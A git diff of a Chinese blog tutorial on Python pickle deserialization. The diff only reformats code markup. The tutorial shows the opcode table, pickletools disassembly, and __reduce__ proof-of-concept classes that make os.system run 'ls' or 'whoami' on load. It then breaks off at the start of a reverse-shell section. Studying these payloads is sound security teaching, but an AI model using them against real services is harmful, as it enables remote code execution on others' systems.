@@ -63,12 +63,10 @@
 </ul>
 <h2 id="pickle模块详解"><a href="#pickle模块详解" class="headerlink" title="pickle模块详解"></a>pickle模块详解</h2><h3 id="pickle基础"><a href="#pickle基础" class="headerlink" title="pickle基础"></a>pickle基础</h3><p>pickle是一种独立的序列化栈语言，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高。</p>
 <p>序列化函数：</p>
-<pre class="language-python" data-language="python"><code class="language-python">pickle<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>文件<span class="token punctuation">)</span> 
-pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>字符串<span class="token punctuation">)</span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pickle.dump(文件) </span><br><span class="line">pickle.dumps(字符串)</span><br></pre></td></tr></table></figure>
 
 <p>反序列化函数：</p>
-<pre class="language-python" data-language="python"><code class="language-python">pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span>文件<span class="token punctuation">)</span>
-pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>字符串<span class="token punctuation">)</span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pickle.load(文件)</span><br><span class="line">pickle.loads(字符串)</span><br></pre></td></tr></table></figure>
 
 
 
@@ -90,34 +88,10 @@ pickle<span class="token punctuation">.</span>loads<span class="token punctuatio
 <li><p>demo</p>
 </li>
 </ul>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python3</span>
-<span class="token comment">#-*— coding:utf-8 -*-</span>
-
-<span class="token keyword">import</span> os
-<span class="token keyword">import</span> pickle
-
-<span class="token keyword">class</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-	<span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
-		<span class="token keyword">return</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-		
-obj <span class="token operator">=</span> Student<span class="token punctuation">(</span><span class="token punctuation">)</span>
-serialize <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>serialize<span class="token punctuation">)</span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/env python3</span></span><br><span class="line"><span class="comment">#-*— coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">		<span class="keyword">return</span>(os.system,(<span class="string">&#x27;ls&#x27;</span>,))</span><br><span class="line">		</span><br><span class="line">obj = Student()</span><br><span class="line">serialize = pickle.dumps(obj, protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(serialize)</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210218113123136.png" alt="image-20210218113123136"></p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python3</span>
-<span class="token comment">#-*— coding:utf-8 -*-</span>
-
-<span class="token keyword">import</span> os
-<span class="token keyword">import</span> pickle
-
-<span class="token keyword">class</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-	<span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
-		<span class="token keyword">return</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-		
-obj <span class="token operator">=</span> Student<span class="token punctuation">(</span><span class="token punctuation">)</span>
-serialize <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
-unserialize <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>serialize<span class="token punctuation">)</span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/env python3</span></span><br><span class="line"><span class="comment">#-*— coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">		<span class="keyword">return</span>(os.system,(<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line">		</span><br><span class="line">obj = Student()</span><br><span class="line">serialize = pickle.dumps(obj, protocol=<span class="number">0</span>)</span><br><span class="line">unserialize = pickle.loads(serialize)</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210218132059917.png" alt="image-20210218132059917"></p>
 <h3 id="pickle过程详解"><a href="#pickle过程详解" class="headerlink" title="pickle过程详解"></a>pickle过程详解</h3><ul>
@@ -144,16 +118,7 @@ unserialize <span class="token operator">=</span> pickle<span class="token punct
 <h3 id="opcode版本"><a href="#opcode版本" class="headerlink" title="opcode版本"></a>opcode版本</h3><ul>
 <li>pickle不同的实现版本得到的opcode不相同，但是pickle可以向下兼容，目前一共有六个版本</li>
 </ul>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python3</span>
-<span class="token comment">#-*— coding:utf-8 -*-</span>
-
-<span class="token keyword">import</span> os
-<span class="token keyword">import</span> pickle
-
-a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'zhang'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">:</span><span class="token number">19</span><span class="token punctuation">&#125;</span>
-
-<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'pickle版本</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">,</span> protocol<span class="token operator">=</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/env python3</span></span><br><span class="line"><span class="comment">#-*— coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;zhang&#x27;</span>, <span class="string">&#x27;age&#x27;</span>:<span class="number">19</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&#x27;pickle版本<span class="subst">&#123;i&#125;</span>&#x27;</span>, pickle.dumps(a, protocol=i))</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>运行结果</li>
@@ -162,90 +127,23 @@ a <span class="token operator">=</span> <span class="token punctuation">&#123;</
 <ul>
 <li>pickle3版本的opcode详解:</li>
 </ul>
-<pre class="language-none"><code class="language-none">&#123;&#39;name&#39;:&#39;zhang&#39;, &#39;age&#39;:19&#125;
-b&#39;\x80\x03&#125;q\x00(X\x04\x00\x00\x00nameq\x01X\x05\x00\x00\x00zhangq\x02X\x03\x00\x00\x00ageq\x03K\x13u.&#39;
-# \x80：协议头声明 
-# \x03：协议版本
-# \x04\x00\x00\x00: 数据长度4
-# name: 数据
-# q： 存储栈顶的字符串长度: 一个字节(即\x00)
-# \x13u:代表栈顶位置
-# .: 数据结束符</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;:&#x27;zhang&#x27;, &#x27;age&#x27;:19&#125;</span><br><span class="line">b&#x27;\x80\x03&#125;q\x00(X\x04\x00\x00\x00nameq\x01X\x05\x00\x00\x00zhangq\x02X\x03\x00\x00\x00ageq\x03K\x13u.&#x27;</span><br><span class="line"># \x80：协议头声明 </span><br><span class="line"># \x03：协议版本</span><br><span class="line"># \x04\x00\x00\x00: 数据长度4</span><br><span class="line"># name: 数据</span><br><span class="line"># q： 存储栈顶的字符串长度: 一个字节(即\x00)</span><br><span class="line"># \x13u:代表栈顶位置</span><br><span class="line"># .: 数据结束符</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>指令集</li>
 </ul>
-<pre class="language-none"><code class="language-none">MARK           &#x3D; b&#39;(&#39;   # push special markobject on stack
-STOP           &#x3D; b&#39;.&#39;   # every pickle ends with STOP
-POP            &#x3D; b&#39;0&#39;   # discard topmost stack item
-POP_MARK       &#x3D; b&#39;1&#39;   # discard stack top through topmost markobject
-DUP            &#x3D; b&#39;2&#39;   # duplicate top stack item
-FLOAT          &#x3D; b&#39;F&#39;   # push float object; decimal string argument
-INT            &#x3D; b&#39;I&#39;   # push integer or bool; decimal string argument
-BININT         &#x3D; b&#39;J&#39;   # push four-byte signed int
-BININT1        &#x3D; b&#39;K&#39;   # push 1-byte unsigned int
-LONG           &#x3D; b&#39;L&#39;   # push long; decimal string argument
-BININT2        &#x3D; b&#39;M&#39;   # push 2-byte unsigned int
-NONE           &#x3D; b&#39;N&#39;   # push None
-PERSID         &#x3D; b&#39;P&#39;   # push persistent object; id is taken from string arg
-BINPERSID      &#x3D; b&#39;Q&#39;   #  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack
-REDUCE         &#x3D; b&#39;R&#39;   # apply callable to argtuple, both on stack
-STRING         &#x3D; b&#39;S&#39;   # push string; NL-terminated string argument
-BINSTRING      &#x3D; b&#39;T&#39;   # push string; counted binary string argument
-SHORT_BINSTRING&#x3D; b&#39;U&#39;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes
-UNICODE        &#x3D; b&#39;V&#39;   # push Unicode string; raw-unicode-escaped&#39;d argument
-BINUNICODE     &#x3D; b&#39;X&#39;   #   &quot;     &quot;       &quot;  ; counted UTF-8 string argument
-APPEND         &#x3D; b&#39;a&#39;   # append stack top to list below it
-BUILD          &#x3D; b&#39;b&#39;   # call __setstate__ or __dict__.update()
-GLOBAL         &#x3D; b&#39;c&#39;   # push self.find_class(modname, name); 2 string args
-DICT           &#x3D; b&#39;d&#39;   # build a dict from stack items
-EMPTY_DICT     &#x3D; b&#39;&#125;&#39;   # push empty dict
-APPENDS        &#x3D; b&#39;e&#39;   # extend list on stack by topmost stack slice
-GET            &#x3D; b&#39;g&#39;   # push item from memo on stack; index is string arg
-BINGET         &#x3D; b&#39;h&#39;   #   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg
-INST           &#x3D; b&#39;i&#39;   # build &amp; push class instance
-LONG_BINGET    &#x3D; b&#39;j&#39;   # push item from memo on stack; index is 4-byte arg
-LIST           &#x3D; b&#39;l&#39;   # build list from topmost stack items
-EMPTY_LIST     &#x3D; b&#39;]&#39;   # push empty list
-OBJ            &#x3D; b&#39;o&#39;   # build &amp; push class instance
-PUT            &#x3D; b&#39;p&#39;   # store stack top in memo; index is string arg
-BINPUT         &#x3D; b&#39;q&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg
-LONG_BINPUT    &#x3D; b&#39;r&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg
-SETITEM        &#x3D; b&#39;s&#39;   # add key+value pair to dict
-TUPLE          &#x3D; b&#39;t&#39;   # build tuple from topmost stack items
-EMPTY_TUPLE    &#x3D; b&#39;)&#39;   # push empty tuple
-SETITEMS       &#x3D; b&#39;u&#39;   # modify dict by adding topmost key+value pairs
-BINFLOAT       &#x3D; b&#39;G&#39;   # push float; arg is 8-byte float encoding
-
-TRUE           &#x3D; b&#39;I01\n&#39;  # not an opcode; see INT docs in pickletools.py
-FALSE          &#x3D; b&#39;I00\n&#39;  # not an opcode; see INT docs in pickletools.py</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">MARK           = b&#x27;(&#x27;   # push special markobject on stack</span><br><span class="line">STOP           = b&#x27;.&#x27;   # every pickle ends with STOP</span><br><span class="line">POP            = b&#x27;0&#x27;   # discard topmost stack item</span><br><span class="line">POP_MARK       = b&#x27;1&#x27;   # discard stack top through topmost markobject</span><br><span class="line">DUP            = b&#x27;2&#x27;   # duplicate top stack item</span><br><span class="line">FLOAT          = b&#x27;F&#x27;   # push float object; decimal string argument</span><br><span class="line">INT            = b&#x27;I&#x27;   # push integer or bool; decimal string argument</span><br><span class="line">BININT         = b&#x27;J&#x27;   # push four-byte signed int</span><br><span class="line">BININT1        = b&#x27;K&#x27;   # push 1-byte unsigned int</span><br><span class="line">LONG           = b&#x27;L&#x27;   # push long; decimal string argument</span><br><span class="line">BININT2        = b&#x27;M&#x27;   # push 2-byte unsigned int</span><br><span class="line">NONE           = b&#x27;N&#x27;   # push None</span><br><span class="line">PERSID         = b&#x27;P&#x27;   # push persistent object; id is taken from string arg</span><br><span class="line">BINPERSID      = b&#x27;Q&#x27;   #  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span><br><span class="line">REDUCE         = b&#x27;R&#x27;   # apply callable to argtuple, both on stack</span><br><span class="line">STRING         = b&#x27;S&#x27;   # push string; NL-terminated string argument</span><br><span class="line">BINSTRING      = b&#x27;T&#x27;   # push string; counted binary string argument</span><br><span class="line">SHORT_BINSTRING= b&#x27;U&#x27;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span><br><span class="line">UNICODE        = b&#x27;V&#x27;   # push Unicode string; raw-unicode-escaped&#x27;d argument</span><br><span class="line">BINUNICODE     = b&#x27;X&#x27;   #   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span><br><span class="line">APPEND         = b&#x27;a&#x27;   # append stack top to list below it</span><br><span class="line">BUILD          = b&#x27;b&#x27;   # call __setstate__ or __dict__.update()</span><br><span class="line">GLOBAL         = b&#x27;c&#x27;   # push self.find_class(modname, name); 2 string args</span><br><span class="line">DICT           = b&#x27;d&#x27;   # build a dict from stack items</span><br><span class="line">EMPTY_DICT     = b&#x27;&#125;&#x27;   # push empty dict</span><br><span class="line">APPENDS        = b&#x27;e&#x27;   # extend list on stack by topmost stack slice</span><br><span class="line">GET            = b&#x27;g&#x27;   # push item from memo on stack; index is string arg</span><br><span class="line">BINGET         = b&#x27;h&#x27;   #   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span><br><span class="line">INST           = b&#x27;i&#x27;   # build &amp; push class instance</span><br><span class="line">LONG_BINGET    = b&#x27;j&#x27;   # push item from memo on stack; index is 4-byte arg</span><br><span class="line">LIST           = b&#x27;l&#x27;   # build list from topmost stack items</span><br><span class="line">EMPTY_LIST     = b&#x27;]&#x27;   # push empty list</span><br><span class="line">OBJ            = b&#x27;o&#x27;   # build &amp; push class instance</span><br><span class="line">PUT            = b&#x27;p&#x27;   # store stack top in memo; index is string arg</span><br><span class="line">BINPUT         = b&#x27;q&#x27;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span><br><span class="line">LONG_BINPUT    = b&#x27;r&#x27;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span><br><span class="line">SETITEM        = b&#x27;s&#x27;   # add key+value pair to dict</span><br><span class="line">TUPLE          = b&#x27;t&#x27;   # build tuple from topmost stack items</span><br><span class="line">EMPTY_TUPLE    = b&#x27;)&#x27;   # push empty tuple</span><br><span class="line">SETITEMS       = b&#x27;u&#x27;   # modify dict by adding topmost key+value pairs</span><br><span class="line">BINFLOAT       = b&#x27;G&#x27;   # push float; arg is 8-byte float encoding</span><br><span class="line"></span><br><span class="line">TRUE           = b&#x27;I01\n&#x27;  # not an opcode; see INT docs in pickletools.py</span><br><span class="line">FALSE          = b&#x27;I00\n&#x27;  # not an opcode; see INT docs in pickletools.py</span><br></pre></td></tr></table></figure>
 
 
 
 <h3 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a>pickletools</h3><p>该工具可以方便的把opcode代码转化成肉眼便于阅读的形式。pickletools是python自带的pickle调试器，有三个功能：反汇编一个已经被打包的字符串、优化一个已经被打包的字符串、返回一个迭代器来供程序使用。</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python3</span>
-<span class="token comment">#-*— coding:utf-8 -*-</span>
-
-<span class="token keyword">import</span> pickletools
-
-data <span class="token operator">=</span> <span class="token string">b"\x80\x03&#125;q\x00(X\x04\x00\x00\x00nameq\x01X\x05\x00\x00\x00zhangq\x02X\x03\x00\x00\x00ageq\x03K\x13u."</span>
-
-pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>data<span class="token punctuation">)</span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/env python3</span></span><br><span class="line"><span class="comment">#-*— coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">data = <span class="string">b&quot;\x80\x03&#125;q\x00(X\x04\x00\x00\x00nameq\x01X\x05\x00\x00\x00zhangq\x02X\x03\x00\x00\x00ageq\x03K\x13u.&quot;</span></span><br><span class="line"></span><br><span class="line">pickletools.dis(data)</span><br></pre></td></tr></table></figure>
 
 <p>得到原始字符串的反汇编结果：</p>
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210219092045080.png" alt="image-20210219092045080"></p>
 <p>反汇编功能：解析字符串，告诉你这个字符串做了什么事情，每一行都是一个指令。</p>
 <p>优化功能:</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python3</span>
-<span class="token comment">#-*— coding:utf-8 -*-</span>
-
-<span class="token keyword">import</span> pickletools
-
-data <span class="token operator">=</span> <span class="token string">b"\x80\x03&#125;q\x00(X\x04\x00\x00\x00nameq\x01X\x05\x00\x00\x00zhangq\x02X\x03\x00\x00\x00ageq\x03K\x13u."</span>
-
-data <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
-
-pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>data<span class="token punctuation">)</span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/env python3</span></span><br><span class="line"><span class="comment">#-*— coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">data = <span class="string">b&quot;\x80\x03&#125;q\x00(X\x04\x00\x00\x00nameq\x01X\x05\x00\x00\x00zhangq\x02X\x03\x00\x00\x00ageq\x03K\x13u.&quot;</span></span><br><span class="line"></span><br><span class="line">data = pickletools.optimize(data)</span><br><span class="line"></span><br><span class="line">pickletools.dis(data)</span><br></pre></td></tr></table></figure>
 
 <p>运行结果：</p>
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210219095145179.png" alt="image-20210219095145179"></p>
@@ -266,50 +164,17 @@ pickletools<span class="token punctuation">.</span>dis<span class="token punctua
 <li>执行系统命令payload</li>
 </ul>
 <p>dopickle.py</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
-<span class="token comment">#coding: utf-8</span>
-
-<span class="token keyword">import</span> pickle
-<span class="token keyword">import</span> os
-
-<span class="token keyword">class</span> <span class="token class-name">genpoc</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        s <span class="token operator">=</span> <span class="token triple-quoted-string string">"""whoami"""</span>  <span class="token comment">#要执行的命令</span>
-        <span class="token keyword">return</span> os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token punctuation">)</span>        <span class="token comment">#os.system("echo test >poc.txt")</span>
-
-e <span class="token operator">=</span> genpoc<span class="token punctuation">(</span><span class="token punctuation">)</span>
-poc <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>e<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span>
-pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>poc<span class="token punctuation">)</span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">genpoc</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;whoami&quot;&quot;&quot;</span>  <span class="comment">#要执行的命令</span></span><br><span class="line">        <span class="keyword">return</span> os.system, (s,)        <span class="comment">#os.system(&quot;echo test &gt;poc.txt&quot;)</span></span><br><span class="line"></span><br><span class="line">e = genpoc()</span><br><span class="line">poc = pickle.dumps(e)</span><br><span class="line"><span class="built_in">print</span>(poc)</span><br><span class="line">pickle.loads(poc)</span><br></pre></td></tr></table></figure>
 
 <p>输出结果命令执行了</p>
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210220105856952.png" alt="image-20210220105856952"></p>
 <p>比较重要的几个操作码</p>
-<pre class="language-python" data-language="python"><code class="language-python">c <span class="token punctuation">:</span> 读取本行的内容作为模块名<span class="token punctuation">(</span> module <span class="token punctuation">)</span> <span class="token punctuation">,</span> 读取下一行的内容作为对象名<span class="token punctuation">(</span> <span class="token builtin">object</span> <span class="token punctuation">)</span> <span class="token punctuation">.</span> 然后将 module<span class="token punctuation">.</span><span class="token builtin">object</span> 作为可调用对象压入到栈中
-<span class="token punctuation">(</span> <span class="token punctuation">:</span> 将一个标记对象压入到栈中 <span class="token punctuation">,</span> 用于确定命令执行的位置 <span class="token punctuation">.</span> 该标记常常搭配 t 指令一起使用 <span class="token punctuation">,</span> 以便产生一个元组
-S <span class="token punctuation">:</span> 后面跟字符串 <span class="token punctuation">,</span> PVM会读取引号中的内容 <span class="token punctuation">,</span> 直到遇见换行符 <span class="token punctuation">,</span> 然后将读取到的内容压入到栈中
-t <span class="token punctuation">:</span> 从栈中不断弹出数据 <span class="token punctuation">,</span> 弹射顺序与压栈时相同 <span class="token punctuation">,</span> 直到弹出左括号 <span class="token punctuation">.</span> 此时弹出的内容形成了一个元组 <span class="token punctuation">,</span> 然后 <span class="token punctuation">,</span> 该元组会被压入栈中 <span class="token punctuation">.</span>
-R <span class="token punctuation">:</span> 将之前压入栈中的元组和可调用对象全部弹出 <span class="token punctuation">,</span> 然后将该元组作为可调用参数的对象并执行该对象  <span class="token punctuation">.</span>最后将结果压入到栈中 <span class="token punctuation">.</span>
-<span class="token punctuation">.</span> <span class="token punctuation">:</span> 结束整个 Pickle 反序列化过程 <span class="token punctuation">.</span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c : 读取本行的内容作为模块名( module ) , 读取下一行的内容作为对象名( <span class="built_in">object</span> ) . 然后将 module.<span class="built_in">object</span> 作为可调用对象压入到栈中</span><br><span class="line">( : 将一个标记对象压入到栈中 , 用于确定命令执行的位置 . 该标记常常搭配 t 指令一起使用 , 以便产生一个元组</span><br><span class="line">S : 后面跟字符串 , PVM会读取引号中的内容 , 直到遇见换行符 , 然后将读取到的内容压入到栈中</span><br><span class="line">t : 从栈中不断弹出数据 , 弹射顺序与压栈时相同 , 直到弹出左括号 . 此时弹出的内容形成了一个元组 , 然后 , 该元组会被压入栈中 .</span><br><span class="line">R : 将之前压入栈中的元组和可调用对象全部弹出 , 然后将该元组作为可调用参数的对象并执行该对象  .最后将结果压入到栈中 .</span><br><span class="line">. : 结束整个 Pickle 反序列化过程 .</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>反弹shell</li>
 </ul>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
-<span class="token comment">#coding: utf-8</span>
-
-<span class="token keyword">import</span> pickle
-<span class="token keyword">import</span> os
-
-<span class="token keyword">class</span> <span class="token class-name">genpoc</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
